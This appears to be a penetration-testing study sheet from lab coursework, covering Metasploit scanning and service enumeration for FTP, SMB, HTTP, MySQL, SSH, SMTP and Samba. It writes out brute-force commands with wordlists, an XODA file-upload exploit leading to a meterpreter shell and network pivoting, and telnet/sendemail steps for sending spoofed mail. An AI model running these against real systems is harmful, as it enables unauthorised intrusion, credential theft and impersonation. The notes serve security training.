## Nmap Scripting Engine (NSE)
### Importing Nmap Scan Results into MSF
What we want to do firstly is start the PostgreSQL database service.
```
service postgresql start
```

Then open the MSF Console:
`check the status of the database.` 
```msf
msf6> db_status
```

`check for the workspace`, `making new workspace`:
```
msf6> workspace
msf6> workspace -a 2k12
msf6> workspace
	default Win2k12
```

`importing the scan results`:
```
msf6> db_import /root/windows_server_2012
msf6> hosts |~to check the data has been imported.
msf6> services
msf6> vulns |~ to list out vulnerabilities if present.
```

`using nmap scan within MSF Console and will be auto saved in database`
```
db_nmap -Pn -sV -O 10.4.22.173
```

---
### Port Scanning with Auxiliary Modules
Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
```
msf6> workspace -a Port_Scan
msf6 auxiliary(scanner/portscan/tcp)> ifconfig
msf6> search portscan
msf6> use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp)> show options
msf6 auxiliary(scanner/portscan/tcp)> set RHOSTS <Targrt_IP>
msf6 auxiliary(scanner/portscan/tcp)> run
msf6 auxiliary(scanner/portscan/tcp)> curl <Target_IP>
msf6 auxiliary(scanner/portscan/tcp)> search XODA
msf6 auxiliary(scanner/portscan/tcp)> use exploit/unix/webapp/xoda_file upload
msf6 exploit(unix/webapp/xoda_file_upload)> set RHOSTS <IP>
msf6 exploit(unix/webapp/xoda_file_upload)> set TARGETURI /
msf6 exploit(unix/webapp/xoda_file_upload)> exploit
```

`search XODA`: XODA= looking for the exploit for the site xoda

after exploit gets executed we will get a meterpreter session

```
meterpreter> sysinfo
meterpreter> shell
	''Spawn a bash session''
/bin/bash -i
www-data@victim-1 ifconfig
```

After getting the IP of eth1 interface we can add the route  within the `meterpreter`
```
meterpreter> run autoroute -s 192.113.124.2
meterpreter> background

msf6 exploit(unix/webapp/xoda_file_upload)> sessions
msf6 exploit(unix/webapp/xoda_file_upload)> search portscan
msf6 exploit(unix/webapp/xoda_file_upload)> use auxiliary/scanner/portscai/tcp
msf6 auxiliary(scanner/portscan/tcp)> set RHOSTS <Targrt-2_IP>
msf6 auxiliary(scanner/portscan/tcp)> run


```
`s`: Subnet
`background`: It's gonna background the session 1
`sessions`: To view your active session

---
### FTP Enumeration
1. Firstly check the open ports in the target system:
```msf
msfconsole
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.51.147.3
run
```

2. `ftp_version` : to check FTP version
```msf
search ftp        OR
search auxilary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.51.147.3
run
```
We can also search for the specific version after running `ftp-verson`
```msf
search ProFTPD
```

3. `ftp_login` : to BF login credentials
	-> user : */usr/share/metasploit-framework/data/wordlists/common_users.txt*
	-> pass : */usr/share/metasploit-framework/data/wordlists/unix_passwords.txt*
```msf
search auxilary name:ftp
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.51.147.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

ftp 192.51.145.3
```
NOTE : BF can cause a DOS attack on target and make it down.

4. `anonymous` : this module helps to check whether we can login it as anonymous user or NOT.
```
search auxilary ftp/anonymous
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.51.145.3

```

5. nmap script to Brute Force :
```
echo 'sysadmin' > users
nmap -p 21 --script=ftp-brute 192.237.183.3 --script-args userdb=./users
```

----
### SMB Enumeration
1. `smb_veriosn` : used to find SMB service version
2. `smb_enumusers` : enumerate users on SMB port
3. `smb_enumshares` : enumerate shares 
4. `smb_login` : BF the login creds

-> `smbclient -L \\\\IP\\ -U user` : get into the SMB 
-> `smbclient \\\\IP\\SHARE -U user` : get into a particular share

###### scripts & tools
-> `--script=smb-os-discovery` : get you the adject version of SMB service.
-> `nmblookup -A demo.ine.local` : tools to play with sbm
-> `smbclient -L ////demo.ine.local -U anonymous` : anonymous login in SMB 

-> `rpcclient -U "" -N demo.ine.local` : rpcclient tool to work with SMB 
	-> `rpcclient $> querydominfo`

----
#### HTTP Enumeration
1. `http_version` : get the adject version
2. `http_header` : get the uncommon headers
3. `robots_txt` : get you the robots.txt
4. `dir_scanner` : dir enumeration module in msf
	-> /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
5. `files_dir` : file enumeration just like dir enum
	-> /usr/share/metasploit-framework/data/wmap/wmap_files.txt
6. `http_login` : BF the creds of a HTTP website 
	*user lists*
	-> /usr/share/metasploit-framework/data/http_default_users.txt
	-> /usr/share/metasploit-framework/data/wordlists/namelist.txt
	*pass lists*
	-> /usr/share/metasploit-framework/data/http_default_pass.txt
	-> /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
7. `http_userdir_enum` : get the potential usernames form apache website.

----
#### MySQL Enumeration
-> `search type:auxiliary name:mysql`

1. `mysql_version` : to get the version
2. `mysql_version` : perform a BF 
3. `mysql_enum` : help to enumerate DB, *need USER/PASS*
4. `mysql_sql` : used to execute SQL queries on the server *need USER/PASS* 
5. `mysql_schemadump` : dump all the tables of inside schema.
6. `mysql_writable_dirs` : check which directory is writable in system *need USER/PASS*
	-> /usr/share/metasploit-framework/data/wordlists/directory.txt

-> `mysql -h IP -u root -p`  : connect to the SQL DB

----
#### SSH Enumeration
-> `search type:auxiliary name:ssh` 

1. `ssh_version` : get the adject version

-> if the target is configured to authenticate by a USER:PASS pair then use this
2. `ssh_login` : perform a BF for USER/PASS

->  if the target is configured to authenticate by a PUBKEY pair then use this
3. `ssh_login_pubkey` : perform a BF for PUBLIC KEYS.

4. `ssh_enumusers` : used to enumerate users.
	-> /usr/share/metasploit-framework/data/http_default_users.txt
	->/usr/share/metasploit-framework/data/wordlists/common_users.txt
	-> usr/share/metasploit-framework/data/wordlists/common_passwords.txt

#### SMTP Enumeration
-> `search type:auxiliary name:smtp`
-> Port : 25 , 465 , 587 

1. `smtp_version` : get the version of SMTP -> also give email/domain of the version
2. `smtp_enum` : enumerate users , emails on the SMTP.

-> `nc demo.ine.local 25` : connect with SMTP
-> `EHLO openmailbox.xyz` : Start with SMTP (this mail comes on banner when you try to connect with `nc` or `telnet`.
-> `EHLO openmailbox.xyz` : pop up all the commands present on the server
-> `VRFY user` : replace user with actual user like admin : to check whether a user is present on the server or not !!

--> command to enumerate users 
	`smtp-user-enum -t demo.ine.local -U /usr/share/commix/src/txt/usernames.txt -M VRFY`

-> Commands to send mail on the server to any user 
```bash
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

-> `sendmail` : command to send mails over SMTP though Terminal 
	-> `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no`
	-> `-f` : FROM
	-> `-t` : TO
	-> `-s` : SMTP Server (IP)	
	-> `-u` : subject
	-> `-m` : message body
	-> `-o` : setting the TLS off 

-----
#### SAMBA
-> PORT : 139/445

Plot : It usage USER/PASS Authentication in order to obtain access to the server , now we can do a Brute Force attack in order to gain access to the server.

###### Tools : 
1. `SMBClient` :
	-> `smbclient -L IP -U USERNAME` : get the shares name.
	-> `smbclient //IP/SHARE -U USERNAME` : get the particular share data.
	-> `get FILENAME` : get download a file

2. `SMBMap` :
	->  `smbmap -H IP -u USERNAME -p PASSWORD`

3. `enum4linux` : tool used to enumerate samba server. alt of `enum.exe` : for windows
	-> `enum4linux -a -u USER -p PASSWORD IP` : to get all information about the samba server
	-> `enum4linux -a IP` : in case , if don't have USER/PASS.
	-> `enum4linux -a -u admin -p password1 demo.ine.local`

4. `hydra` : to perform BF
	-> `hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  demo.ine.local smb`

5. `auxiliary/scanner/smb/pipe_auditor `
	-> MSF Module to file pipe 

###### version 3.0.20 :: vulnerable to command injection :: MSF module :: No auth need

----
#### PHP 
-> search for and `phpinfo.php` file and additional information related to PHP
-> USE _directory enumeration_ tool with `-x php`
-> Version `< 5.3.1` are vulnerable to _REMOTE CODE EXECUTION_

